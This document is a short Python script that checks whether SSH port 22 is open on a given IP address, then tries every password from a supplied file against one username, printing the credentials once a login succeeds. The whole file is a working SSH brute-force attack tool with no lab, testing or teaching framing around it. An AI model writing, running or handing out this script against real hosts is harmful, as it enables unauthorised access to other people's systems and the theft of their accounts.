import paramiko
import socket

def ssh_password_login(ip, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, username=username, password=password)
        client.close()
        return True
    except Exception:
        client.close()
        return False

def check_open_port(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((host, port))
        sock.close()
        if result == 0:
            return True
        else:
            return False
    except Exception:
        return False

if __name__ == '__main__':
    ip = input("Enter the IP address of the host: ")
    username = input("Enter the username: ")
    password_file = input("Enter the file path containing passwords to try: ")
    
    with open(password_file, 'r') as f:
        passwords = f.read().splitlines()
    
    if check_open_port(ip, 22):
        for password in passwords:
            if ssh_password_login(ip, username, password):
                print(f"Successful login with username: {username} and password: {password}")
                break
            else:
                print(f"Login failed for username: {username} and password: {password}")
